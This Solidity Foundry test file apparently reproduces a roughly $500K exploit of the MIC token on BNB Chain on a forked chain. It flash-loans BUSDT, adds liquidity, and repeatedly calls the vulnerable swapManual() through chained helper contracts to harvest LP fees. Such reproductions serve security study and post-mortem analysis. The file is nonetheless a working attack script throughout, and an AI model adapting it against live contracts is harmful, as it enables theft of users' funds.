// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~$500K
// Attacker : https://bscscan.com/address/0x1703062d657c1ca439023f0993d870f4707a37ff
// Attack Contract : https://bscscan.com/address/0xafebc0a9e26fea567cc9e6dd7504800c67f4e3fe
// Vulnerable Contract : https://bscscan.com/address/0xb38c2d2d6a168d41aa8eb4cead47e01badbdcf57
// Attack Tx : https://app.blocksec.com/explorer/tx/bsc/0x316c35d483b72700e6f4984650d217304146b3732bb148e32fa7f8017843eb24

// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0xb38c2d2d6a168d41aa8eb4cead47e01badbdcf57#code

// @Analysis
// Post-mortem :
// Twitter Guy : https://x.com/MetaSec_xyz/status/1742484748239536173
// Hacking God :

interface IMIC is IERC20 {
    function swapManual() external;
}

contract ContractTest is Test {
    uint256 private constant blocknumToForkFrom = 34_905_161;
    Uni_Pair_V3 private constant BUSDT_USDC = Uni_Pair_V3(0x92b7807bF19b7DDdf89b706143896d05228f3121);
    Uni_Pair_V2 private constant BUSDT_MIC = Uni_Pair_V2(0xB3611B1cbDDB14bC847906BfB9c443AC724A54dC);
    Uni_Pair_V2 private constant MIC_WBNB = Uni_Pair_V2(0xfEe55F16FD5Aec503B73146045b1474925a74dec);
    Uni_Router_V2 private constant Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    IMIC private constant MIC = IMIC(0xb38C2D2d6A168D41AA8eB4CEAd47E01BadbDCF57);
    IERC20 private constant BUSDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IWBNB private constant WBNB = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
    // Fake token contract deployed by exploiter
    IUSDT private constant FakeUSDT = IUSDT(0x9f779d61a7139960577CF7392892296F30D86df7);
    address private constant exploiter = 0x1703062d657c1ca439023F0993D870F4707a37FF;
    address private constant attackContract = 0xaFEBc0A9e26fea567cC9E6Dd7504800c67f4E3fE;

    uint256 private constant flashBUSDTAmount = 1_700e18;

    function setUp() public {
        vm.createSelectFork("bsc", blocknumToForkFrom);
        vm.label(address(BUSDT_USDC), "BUSDT_USDC");
        vm.label(address(BUSDT_MIC), "BUSDT_MIC");
        vm.label(address(Router), "Router");
        vm.label(address(MIC), "MIC");
        vm.label(address(BUSDT), "BUSDT");
        vm.label(address(WBNB), "WBNB");
        vm.label(address(FakeUSDT), "FakeUSDT");
    }

    function testExploit() public {
        deal(address(BUSDT), address(this), 0);
        deal(address(this), 0);
        emit log_named_decimal_uint(
            "Exploiter BUSDT balance before attack",
            BUSDT.balanceOf(address(this)),
            BUSDT.decimals()
        );

        // Flashloan 1700 BUSDT tokens
        BUSDT_USDC.flash(address(this), flashBUSDTAmount, 0, abi.encodePacked(uint8(0)));

        emit log_named_decimal_uint(
            "Exploiter BUSDT balance after attack",
            BUSDT.balanceOf(address(this)),
            BUSDT.decimals()
        );
    }

    function pancakeV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external {
        approveRouter();
        // Here I decided to skip the swap from Fake USDT to BUSDT because of some restrictions when
        // calling Fake USDT protected transferFrom() function from Router when swapping (also this is unnecessary step)
        // Swap 1 FakeUSDT
        // FakeUSDTToBUSDT();
        deal(address(BUSDT), address(this), BUSDT.balanceOf(address(this)) + 3_313_981_013_131_338);
        // Swap half of BUSDT balance to MIC tokens
        BUSDTToMIC();
        // Swap second half of BUSDT tokens to BNB
        BUSDTToBNB();
        // Add liquidity to MIC/WBNB pair. Obtain LP tokens
        Router.addLiquidityETH{value: address(this).balance}(
            address(MIC),
            MIC.balanceOf(address(this)),
            0,
            0,
            address(this),
            block.timestamp + 10
        );

        // Following function make a call to vulnerable swapAndSendLPFee private function
        // Acquire LP fees in BUSDT
        MIC.swapManual();

        LPFeeClaimer currentLpFeeClaimer = new LPFeeClaimer();
        // Transfer LP tokens to helper attack contract for acquiring new LP fees
        // Transfered amount will be approved back to this contract
        MIC_WBNB.transfer(address(currentLpFeeClaimer), MIC_WBNB.balanceOf(address(this)));
        currentLpFeeClaimer.claim();

        uint256 i = 1;
        while (i < 10) {
            LPFeeClaimer newLpFeeClaimer = new LPFeeClaimer();
            // Main (this) attack contract has been approved from current helper attack contract to transfer
            // LP tokens to new helper attack contract
            MIC_WBNB.transferFrom(
                address(currentLpFeeClaimer),
                address(newLpFeeClaimer),
                MIC_WBNB.balanceOf(address(currentLpFeeClaimer))
            );
            newLpFeeClaimer.claim();
            currentLpFeeClaimer = newLpFeeClaimer;
            ++i;
        }
        currentLpFeeClaimer.remove();
        BNBToBUSDT();

        // Repay flashloan
        BUSDT.transfer(address(BUSDT_USDC), flashBUSDTAmount + fee0);

        // Additionally - at the end of the attack amount of BUSDT was swapped to Fake USDT tokens
    }

    receive() external payable {}

    function approveRouter() private {
        MIC.approve(address(Router), type(uint256).max);
        BUSDT_MIC.approve(address(Router), type(uint256).max);
        BUSDT.approve(address(Router), type(uint256).max);
        WBNB.approve(address(Router), type(uint256).max);
        // Approve is protected (Ownable).
        vm.prank(attackContract, exploiter);
        FakeUSDT.approve(address(Router), type(uint256).max);
    }

    // function FakeUSDTToBUSDT() private {
    //     address[] memory path = new address[](2);
    //     path[0] = address(FakeUSDT);
    //     path[1] = address(BUSDT);
    //     vm.prank(attackContract, exploiter);
    //     Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
    //         1e18,
    //         0,
    //         path,
    //         address(this),
    //         block.timestamp + 10
    //     );
    // }

    function BUSDTToMIC() private {
        address[] memory path = new address[](2);
        path[0] = address(BUSDT);
        path[1] = address(MIC);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            BUSDT.balanceOf(address(this)) / 2,
            0,
            path,
            address(this),
            block.timestamp + 10
        );
    }

    function BUSDTToBNB() private {
        address[] memory path = new address[](2);
        path[0] = address(BUSDT);
        path[1] = address(WBNB);
        Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            BUSDT.balanceOf(address(this)),
            0,
            path,
            address(this),
            block.timestamp + 10
        );
    }

    function BNBToBUSDT() private {
        address[] memory path = new address[](2);
        path[0] = address(WBNB);
        path[1] = address(BUSDT);
        Router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: address(this).balance}(
            0,
            path,
            address(this),
            block.timestamp + 10
        );
    }
}

contract LPFeeClaimer {
    Uni_Pair_V2 private constant MIC_WBNB = Uni_Pair_V2(0xfEe55F16FD5Aec503B73146045b1474925a74dec);
    Uni_Router_V2 private constant Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    IMIC private constant MIC = IMIC(0xb38C2D2d6A168D41AA8eB4CEAd47E01BadbDCF57);
    IERC20 private constant BUSDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IWBNB private constant WBNB = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));

    constructor() {
        // Approve LP tokens to main attack contract (deployer of this contract).
        MIC_WBNB.approve(msg.sender, type(uint256).max);
    }

    function claim() external {
        // Obtain LP fees
        MIC.swapManual();
        // Transfer obtained LP fees to the main attack contract
        BUSDT.transfer(msg.sender, BUSDT.balanceOf(address(this)));
    }

    // Remove liquidity (MIC/BNB), swap MIC to BNB and finally transfer swapped BNB to main attack contract
    function remove() external {
        MIC_WBNB.approve(address(Router), type(uint256).max);
        MIC.approve(address(Router), type(uint256).max);
        Router.removeLiquidityETHSupportingFeeOnTransferTokens(
            address(MIC),
            MIC_WBNB.balanceOf(address(this)),
            0,
            0,
            address(this),
            block.timestamp + 10
        );
        MICToBNB();
        // Transfer BNB to main attack contract
        (bool success, ) = msg.sender.call{value: address(this).balance}("");
        require(success, "Transfering BNB not successful");
    }

    receive() external payable {}

    function MICToBNB() private {
        address[] memory path = new address[](2);
        path[0] = address(MIC);
        path[1] = address(WBNB);

        Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            MIC.balanceOf(address(this)),
            0,
            path,
            msg.sender,
            block.timestamp + 10
        );
    }
}
